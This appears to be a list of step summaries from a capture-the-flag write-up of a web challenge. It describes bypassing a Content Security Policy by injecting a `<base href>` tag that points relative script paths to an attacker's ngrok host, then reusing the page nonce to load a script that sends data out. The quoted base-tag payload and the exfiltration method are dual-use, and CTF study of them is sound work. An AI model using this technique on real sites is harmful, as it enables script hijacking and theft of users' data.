    "Identified the need to perform an XSS attack, but noted that a Content Security Policy (CSP) was in place to prevent this.",
    "Noticed that the page used relative JavaScript paths, and that the scripts were always executed due to the `nonce` in the CSP.",
    "Changed the base URI of the page to attacker's own server using `<base href=//351b-42-60-216-15.ngrok.io>`.",
    "Noted that the relative paths would now load scripts from the attacker's server, which would usually not be possible due to the CSP.",
    "Hosted a file at `/static/page.js` on the attacker server and enabled CORS to execute arbitrary JavaScript through this file.",
    "Used the `nonce` to bypass the CSP again in order to exfiltrate data.",
    "Created a new script element, added the appropriate `nonce` from the rest of the script tags, and set the script source to the data wanted to exfiltrate.",
    "Appended the new script to the body of the document.",
    "Received the flag on the attacker server, indicating the successful execution of the attack."
